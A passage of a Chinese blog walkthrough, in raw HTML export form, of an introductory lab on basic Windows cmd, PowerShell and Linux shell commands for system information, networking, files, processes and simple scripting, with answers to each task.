plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/set.png\" alt=\"set\"></p>\n<p> <strong>ver</strong>命令查看操作系统的版本</p>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ver</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/ver.png\" alt=\"ver\"></p>\n<p>热身结束 我们看看题</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/task2.png\" alt=\"task\"></p>\n<p>第一题直接用<strong>ver</strong>命令能查出他的os版本</p>\n<p>第二题用<strong>systeminfo</strong>命令来看他的hostname</p>\n<h3 id=\"task3\"><a href=\"#task3\" class=\"headerlink\" title=\"task3\"></a>task3</h3><p> 网络故障排除</p>\n<p> 顾名思义 <strong>ipconfig</strong>命令 或者后面加个&#x2F;all。</p>\n<p> 我们还可以<strong>ping</strong> 域名 如 ping <a href=\"http://www.baidu.com/\">www.baidu.com</a></p>\n<p> 下一个是<strong>tracert</strong> 代表跟踪路由。该命令tracert target_name跟踪到达目标所经过的网络路由</p>\n<p> <strong>nslook</strong><br> nslookup example.com 它查找主机或域并返回其 IP 地址</p>\n<p> netstat<br>此命令显示当前网络连接和监听端口</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/task3.png\" alt=\"task3\"></p>\n<p>第一题使用<strong>ipconfig &#x2F;all</strong>来查找</p>\n<p>第二题 用<strong>netstat</strong>命令来查找 我们要在后面加个 <strong>-abno</strong> 然后找到3389端口那一行</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/ss89.png\" alt=\"er\"></p>\n<p>第三题 在ipconfig那也可以顺便看到掩码是255.255.0.0</p>\n<h3 id=\"task4\"><a href=\"#task4\" class=\"headerlink\" title=\"task4\"></a>task4</h3><p>文件与磁盘管理</p>\n<p><strong>cd命令</strong> 这个和linux中的有异曲同工之妙  </p>\n<p>不带参数的话就和linux的pwd一样 显示当前的路径</p>\n<p><strong>dir</strong>是显示子目录的命令</p>\n<p><strong>tree命令</strong>就和linux命令差不多</p>\n<p>新建和删除文件就是mkdir和rmdir</p>\n<p><strong>copy</strong>命令允许文件从一个位置复制到另一个位置</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy file1 file2</span><br></pre></td></tr></table></figure>\n\n<p><strong>move</strong>命令 移动文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">move file1 文件夹名</span><br></pre></td></tr></table></figure>\n\n<p><strong>erase</strong>命令 删除文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">erase 文件名    </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/task4.png\" alt=\"task4\"></p>\n<p>先cd ..退出到根目录</p>\n<p>然后cd 进题目要求的目录</p>\n<p>more一下txt文件就行</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/flag.png\" alt=\"task4\"></p>\n<h3 id=\"task5\"><a href=\"#task5\" class=\"headerlink\" title=\"task5\"></a>task5</h3><p>任务管理<br><strong>tasklist</strong>命令和<strong>taskkill</strong>命令</p>\n<p>废话不多说 我们看看题</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/task5.png\" alt=\"task5\"></p>\n<p>这题就是看你的熟悉程度 </p>\n<p>第一题就是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tasklist /FI &quot;imagename eq notepad.exe&quot;</span><br></pre></td></tr></table></figure>\n\n<p>第二题</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">taskkill /PID 1516</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"task6\"><a href=\"#task6\" class=\"headerlink\" title=\"task6\"></a>task6</h3><p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/task6.png\" alt=\"task6\"></p>\n<p>shutdown &#x2F;r：重启计算机。<br>shutdown &#x2F;a：取消正在进行的关机或重启操作。</p>\n<h2 id=\"windows-powershell\"><a href=\"#windows-powershell\" class=\"headerlink\" title=\"windows powershell\"></a>windows powershell</h2><p>接下来是powershell</p>\n<p>废话不多说 我们看看task2</p>\n<h3 id=\"task2-1\"><a href=\"#task2-1\" class=\"headerlink\" title=\"task2\"></a>task2</h3><p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/task2.png\" alt=\"task2\"></p>\n<p>我们怎样称呼开发 PowerShell 所采用的高级方法？</p>\n<p>答案:<strong>object-oriented</strong>(面向对象)</p>\n<h3 id=\"task3-1\"><a href=\"#task3-1\" class=\"headerlink\" title=\"task3\"></a>task3</h3><p><strong>powershell基础</strong></p>\n<h4 id=\"打开powershell\"><a href=\"#打开powershell\" class=\"headerlink\" title=\"打开powershell\"></a>打开powershell</h4><p>打开powershell有很多个方法</p>\n<p> 1.开始菜单：powershell在 Windows 开始菜单搜索栏中输入，然后在结果中单击Windows PowerShell或。PowerShell</p>\n<p>2 .运行对话框：按Win + R打开Run对话框，输入powershell，然后点击Enter。</p>\n<p> 3.文件资源管理器：导航到任何文件夹，然后powershell在地址栏中输入，然后按Enter。这将在该特定目录中打开PowerShell 。</p>\n<h4 id=\"cmdlet\"><a href=\"#cmdlet\" class=\"headerlink\" title=\"cmdlet\"></a>cmdlet</h4><p> PowerShell命令称为<strong>cmdlets</strong>。它们比传统的 Windows 命令功能更牛掰，并且允许进行更高级的数据操作。</p>\n<p> Cmdlet 遵循一致的<strong>Verb-Noun</strong>8命名约定</p>\n<p>eg：</p>\n<ul>\n<li><strong>Get-Content</strong>：检索（获取）文件的内容并将其显示在控制台中。</li>\n<li><strong>Set-Location</strong>：更改（设置）当前工作目录。</li>\n</ul>\n<p>假如说你想看看有哪些可用的cmdlet啥的 可以用<strong>get-command</strong>这个命令</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/get-command.png\" alt=\"getcommand\"></p>\n<p>还能在后面加个<strong>commandtype</strong>来筛选自己想要的东西</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/commandtype.png\" alt=\"getcommand\"></p>\n<p>当然不懂的话 我们就用<strong>get-help</strong> 这里用的是get-data。我们可以通过在基本语法中添加一些选项来检索有关 cmdlet 的其他有用信息。</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/help.png\" alt=\"help\"></p>\n<p>get-alias 列出了所有可用的别名<br><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/getalias.png\" alt=\"getalias\"></p>\n<p>我们看一下题目</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/task3.png\" alt=\"task3\"></p>\n<p>第一题 如何检索remove开头命令？<br>用name筛选一下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get-command -name remove*</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/remove.png\" alt=\"remove\"></p>\n<p>第二题 echo这个命令的别名叫啥?</p>\n<p>用<strong>get-command -name</strong> 筛选一下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get-command -name echo</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/echo.png\" alt=\"echo\"></p>\n<p>用于检索New-LocalUser的cmdlet 的一些示例用法的命令是什么</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Get-Help New-LocalUser -examples</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/localuser.png\" alt=\"local\"></p>\n<h3 id=\"task4-1\"><a href=\"#task4-1\" class=\"headerlink\" title=\"task4\"></a>task4</h3><p>文件系统</p>\n<p><strong>Get-ChildItem</strong>列出使用参数指定位置的文件和目录<strong>Path</strong>。它可用于探索目录并查看其内容。<br>如果未Path指定，则 cmdlet 将显示当前工作目录的内容。</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/getchilditem.png\" alt=\"get\"></p>\n<p>要导航到其他目录，我们可以使用<strong>Set-Location</strong>。它会更改当前目录，将我们带到指定路径，类似于cd命令提示符中的命令。</p>\n<p>要在PowerShell中创建一个项目，我们可以使用<strong>New-Item</strong>。</p>\n<p><strong>Remove-Itemcmdlet</strong> 会同时删除目录和文件</p>\n<p>我们可以分别使用<strong>Copy-Item</strong>（相当于copy）和<strong>Move-Item</strong>（相当于move）来复制或移动文件和目录。</p>\n<p>读取和显示文件的内容，我们可以使用 <strong>cmdlet Get-Content</strong>，其工作方式与type命令提示符</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/task4.png\" alt=\"task4\"></p>\n<p>第一题 类似type的命令就是get-content</p>\n<p>第二题  Get-ChildItem -Path C:\\Users (Get-ChildItem之后要加个路径)</p>\n<p>第三题数一下就知道了 四个</p>\n<h3 id=\"task5-1\"><a href=\"#task5-1\" class=\"headerlink\" title=\"task5\"></a>task5</h3><p>管道(|) 是命令行环境中使用的一种技术，允许将一个命令的输出用作另一个命令的输入。</p>\n<h4 id=\"where-object\"><a href=\"#where-object\" class=\"headerlink\" title=\"where-object\"></a>where-object</h4><p> 用于根据条件筛选对象。它会检查输入对象的属性，并根据指定的条件过滤出符合条件的对象。</p>\n<h5 id=\"运算符\"><a href=\"#运算符\" class=\"headerlink\" title=\"运算符\"></a>运算符</h5><p><strong>&gt;-eq</strong>（即“等于”）是与其他脚本语言（例如 Bash、Python）共享的一组比较运算符的一部分。</p>\n<p>-<strong>ne</strong>：“不等于”。此运算符可用于根据指定的条件从结果中排除对象。</p>\n<p><strong>-gt</strong>：“大于”。此运算符将仅过滤超过指定值的对象。需要注意的是，这是一个严格的比较，这意味着等于指定值的对象将被排除在结果之外。</p>\n<p><strong>-ge</strong>：“大于或等于-gt”。这是上一个运算符的非严格版本。与的组合-eq。</p>\n<p><strong>-lt</strong>：“小于”。与“大于”类似，这是一个严格运算符。它仅包含严格低于某个值的对象。</p>\n<p><strong>-le</strong>：“小于或等于”。与 类似，这是前一个运算符的非严格版本。和-ge的组合。-lt-eq</p>\n<p>你已经掌握知识点了 现在我们来做一道题</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/task5.png\" alt=\"task5\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Get-ChildItem | Where-Object -Property Length -gt 100</span><br><span class=\"line\"></span><br><span class=\"line\">-Property Length:指定要检查的属性是 Length。对于文件对象,Length 属性表示文件的大小（以字节为单位）。</span><br><span class=\"line\"></span><br><span class=\"line\">-gt 100:-gt 是 “大于”的缩写，表示筛选出 Length 属性值大于 100 的对象。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"task6-1\"><a href=\"#task6-1\" class=\"headerlink\" title=\"task6\"></a>task6</h3><p>系统与网络信息</p>\n<p><strong>Get-ComputerInfocmdlet</strong> 可检索全面的系统信息，包括操作系统信息、硬件规格、BIOS 详细信息等。</p>\n<p><strong>Get-LocalUser</strong>它列出了系统上的所有本地用户帐户。默认输出显示每个用户的用户名、帐户状态和说明。</p>\n<p><strong>Get-NetIPConfiguration</strong>提供有关系统上网络接口的详细信息，包括 IP 地址、DNS服务器和网关配置。</p>\n<p><strong>Get-NetIPAddresscmdlet</strong> 将显示系统上配置的所有 IP 地址的详细信息，包括当前不活动的 IP 地址。</p>\n<p>简单科普了一下 开始看看题目</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/task6.png\" alt=\"task6\"></p>\n<p>第一题 我们直接输入<strong>get-localuser</strong> 一看就能看出多了一个用户p1r4t3</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/user.png\" alt=\"task6\"></p>\n<p>第二题也可以顺便解出来 因为用户旁边的就是说明 正是题目需要的<br>A merry life and a short one.</p>\n<p>第三题 其实也还好 一开始我以为要远程登录啥的 后来发现是我多虑了 </p>\n<p>直接cd ..退回上一级文件夹 <strong>childitem</strong>一下 就能看到p1r4t3 这个用户的文件夹 </p>\n<p>然后我们 <strong>set-location</strong> p1r4t3 进这个用户的文件夹 就能发现隐藏的宝藏 在进去就可以发现flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set-location Users</span><br><span class=\"line\"></span><br><span class=\"line\">set-location p1r4t3</span><br><span class=\"line\"></span><br><span class=\"line\">set-location hidden-treasure-chest</span><br><span class=\"line\"></span><br><span class=\"line\">get-content big-treasure.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/flag1.png\" alt=\"task6\"></p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/flag2.png\" alt=\"task6\"></p>\n<h3 id=\"task7\"><a href=\"#task7\" class=\"headerlink\" title=\"task7\"></a>task7</h3><p>实时系统分析</p>\n<p><strong>Get-Process</strong>提供所有当前正在运行的进程的详细视图，包括CPU和内存使用情况，使其成为监控和故障排除的强大工具。</p>\n<p><strong>Get-Service</strong>允许检索有关机器上服务状态的信息，例如哪些服务正在运行、停止或暂停。它被系统管理员广泛用于故障排除，也被取证分析师用于寻找系统上安装的异常服务</p>\n<p><strong>Get-NetTCPConnection</strong>请显示当前TCP连接，深入了解本地和远程端点。此 cmdlet 在事件响应或恶意软件分析任务期间特别有用，因为它可以发现隐藏的后门或与攻击者控制的服务器建立的连接。</p>\n<p><strong>Get-FileHash</strong>一个用于生成文件哈希的有用 cmdlet，它在事件响应、威胁搜寻和恶意软件分析中特别有价值，因为它有助于验证文件完整性并检测潜在的篡改。</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/task7.png\" alt=\"task7\"></p>\n<p>第一题 我们在刚才的那个文件夹里输入Get-FileHash命令来看他的hash值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Get-FileHash big-treasure-txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/hash.png\" alt=\"task7\"></p>\n<p>第二题Get-NetTCPConnection 输出的信息中包含一个名为 OwningProcess 的属性，该属性表示每个 TCP 连接所属的进程 ID（PID）。</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/7.2.png\" alt=\"task7\"></p>\n<p>第三题 这一题就很有意思了 题目说是服务 那就要用<strong>get-service</strong><br>我们用| where-object 后面就填我们提示说的displayname 题目说了说明和displayname有关 我们用<strong>-like “<em>merry</em>“</strong>来找出指定的服务 (你也可以直接在后面复制整个说明)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get-service | where-object -like &quot;*merry*&quot; </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/7.3.png\" alt=\"task7\"></p>\n<h3 id=\"task8\"><a href=\"#task8\" class=\"headerlink\" title=\"task8\"></a>task8</h3><p>脚本<br><strong>Invoke-Command</strong>对于在远程系统上执行命令至关重要，因此它对于系统管理员、安全工程师和渗透测试人员来说至关重要。它Invoke-Command 可实现高效的远程管理，并结合脚本实现跨多台机器的任务自动化。它还可用于在渗透测试人员或攻击者的参与过程中在目标系统上执行有效载荷或命令。</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/powershell/task8.png\" alt=\"task7\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Invoke-Command -ComputerName RoyalFortune -ScriptBlock &#123;Get-Service&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"linux-shell\"><a href=\"#linux-shell\" class=\"headerlink\" title=\"linux shell\"></a>linux shell</h2><p>总算来到比较熟悉的地方了 linux还是懂点的 废话不多说开始吧</p>\n<h4 id=\"task2-2\"><a href=\"#task2-2\" class=\"headerlink\" title=\"task2\"></a>task2</h4><p>要查看当前工作目录，可以执行<strong>pwd</strong>，它代表打印工作目录，<br>要查看目录的内容 可以用<strong>ls</strong>命令<br>读取文件的内容 用<strong>cat</strong>命令<br>grep 命令可以搜索文件内的任何单词或模式</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/linux/task2.png\" alt=\"task2\"></p>\n<ul>\n<li>第一题 bash (echo $SHELL可以看你的linux shell当前版本)</li>\n<li>第二题 ls </li>\n<li>第三题 grep</li>\n</ul>\n<h3 id=\"task3-2\"><a href=\"#task3-2\" class=\"headerlink\" title=\"task3\"></a>task3</h3><p>cat &#x2F;etc&#x2F;shell可以列出Linux 操作系统中可用的 shell</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/linux/task3.png\" alt=\"task3\"></p>\n<ul>\n<li>第一题 fish</li>\n<li>第二题 bash</li>\n<li>第三题 history</li>\n</ul>\n<h3 id=\"task4-2\"><a href=\"#task4-2\" class=\"headerlink\" title=\"task4\"></a>task4</h3><p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/linux/task4.png\" alt=\"task3\"></p>\n<ul>\n<li>第一题 #!&#x2F;bin&#x2F;bash</li>\n<li>第二题 chmod +x</li>\n<li>第三题 loops</li>\n</ul>\n<h3 id=\"task5-2\"><a href=\"#task5-2\" class=\"headerlink\" title=\"task5\"></a>task5</h3><p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/linux/task5.png\" alt=\"task3\"></p>\n<p>在看文章的时候 文章说了pin是7385</p>\n<p>答案为7385</p>\n<h3 id=\"task6-2\"><a href=\"#task6-2\" class=\"headerlink\" title=\"task6\"></a>task6</h3><p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/linux/task6.png\" alt=\"task3\"></p>\n<p>我们来看题目要求 进入机子的&#x2F;home&#x2F;user的脚本里面 将三个空修改完</p>\n<p>第一个空是填文件的路径 &#x2F;var&#x2F;log</p>\n<p>第二个空是把文章里面的flag填进去</p>\n<p>第三个空要填$directory （$directory&#x2F;*.log 是一个模式匹配表达式，表示 &#x2F;var&#x2F;log 目录下所有以 .log 结尾的文件。）</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/linux/cat.png\" alt=\"task3\"></p>\n<p>将脚本改完之后 我们开始运行脚本 脚本告诉我们 flag在authentication.log里面</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/linux/cat1.png\" alt=\"task3\"></p>\n<p>我们用cat搜索一下authentication.log里的关键词 成功搜索到</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/linux/cat2.png\" alt=\"task3\"></p>\n<p>OK 传说的三位 我们已经介绍完毕 还有很多内容要我们学习 这些只是个皮面 keep moving</p>\n","excerpt":"","more":"<p>今天咱来到传说中的命令行 话说命令行三分天下 其一是Windows的cmd 其二是Windows powershell 其三是linux的shell 这三个利器要是能全部掌握 那就是传说中的大佬</p>\n<p>命令行比起图形化界面更快 更高效 也更大佬</p>\n<p>这次就简单介绍一下如何使用命令行来：</p>\n<ul>\n<li>显示基本系统信息</li>\n<li>检查并排除网络配置故障</li>\n<li>管理文件和文件夹</li>\n<li>检查正在运行的进程</li>\n</ul>\n<p>一如既往 先ssh连接一下机子 准备操作</p>\n<h2 id=\"Windows命令行\"><a href=\"#Windows命令行\" class=\"headerlink\" title=\"Windows命令行\"></a>Windows命令行</h2><p> MS Windows 命令提示符是cmd.exe</p>\n<h3 id=\"task1\"><a href=\"#task1\" class=\"headerlink\" title=\"task1\"></a>task1</h3><p> <img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/task1.png\" alt=\"task1\"></p>\n<p> 这个不用说 就是cmd.exe</p>\n<h3 id=\"task2\"><a href=\"#task2\" class=\"headerlink\" title=\"task2\"></a>task2</h3><p> 基本系统信息</p>\n<p> <strong>set</strong>命令检查你的路径</p>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/set.png\" alt=\"set\"></p>\n<p> <strong>ver</strong>命令查看操作系统的版本</p>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ver</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/ver.png\" alt=\"ver\"></p>\n<p>热身结束 我们看看题</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/task2.png\" alt=\"task\"></p>\n<p>第一题直接用<strong>ver</strong>命令能查出他的os版本</p>\n<p>第二题用<strong>systeminfo</strong>命令来看他的hostname</p>\n<h3 id=\"task3\"><a href=\"#task3\" class=\"headerlink\" title=\"task3\"></a>task3</h3><p> 网络故障排除</p>\n<p> 顾名思义 <strong>ipconfig</strong>命令 或者后面加个&#x2F;all。</p>\n<p> 我们还可以<strong>ping</strong> 域名 如 ping <a href=\"http://www.baidu.com/\">www.baidu.com</a></p>\n<p> 下一个是<strong>tracert</strong> 代表跟踪路由。该命令tracert target_name跟踪到达目标所经过的网络路由</p>\n<p> <strong>nslook</strong><br> nslookup example.com 它查找主机或域并返回其 IP 地址</p>\n<p> netstat<br>此命令显示当前网络连接和监听端口</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/task3.png\" alt=\"task3\"></p>\n<p>第一题使用<strong>ipconfig &#x2F;all</strong>来查找</p>\n<p>第二题 用<strong>netstat</strong>命令来查找 我们要在后面加个 <strong>-abno</strong> 然后找到3389端口那一行</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/ss89.png\" alt=\"er\"></p>\n<p>第三题 在ipconfig那也可以顺便看到掩码是255.255.0.0</p>\n<h3 id=\"task4\"><a href=\"#task4\" class=\"headerlink\" title=\"task4\"></a>task4</h3><p>文件与磁盘管理</p>\n<p><strong>cd命令</strong> 这个和linux中的有异曲同工之妙  </p>\n<p>不带参数的话就和linux的pwd一样 显示当前的路径</p>\n<p><strong>dir</strong>是显示子目录的命令</p>\n<p><strong>tree命令</strong>就和linux命令差不多</p>\n<p>新建和删除文件就是mkdir和rmdir</p>\n<p><strong>copy</strong>命令允许文件从一个位置复制到另一个位置</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy file1 file2</span><br></pre></td></tr></table></figure>\n\n<p><strong>move</strong>命令 移动文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">move file1 文件夹名</span><br></pre></td></tr></table></figure>\n\n<p><strong>erase</strong>命令 删除文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">erase 文件名    </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/task4.png\" alt=\"task4\"></p>\n<p>先cd ..退出到根目录</p>\n<p>然后cd 进题目要求的目录</p>\n<p>more一下txt文件就行</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/flag.png\" alt=\"task4\"></p>\n<h3 id=\"task5\"><a href=\"#task5\" class=\"headerlink\" title=\"task5\"></a>task5</h3><p>任务管理<br><strong>tasklist</strong>命令和<strong>taskkill</strong>命令</p>\n<p>废话不多说 我们看看题</p>\n<p><img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/task5.png\" alt=\"task5\"></p>\n<p>这题就是看你的熟悉程度 </p>\n<p>第一题就是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tasklist /FI &quot;imagename eq notepad.exe&quot;</span><br></pre></td></tr></table></figure>\n\n<p>第二题</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">taskkill /PID 1516</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"task6\"><a href=\"#task6\" class=\"headerlink\" title=\"task6\"></a>task6</h3><p><img 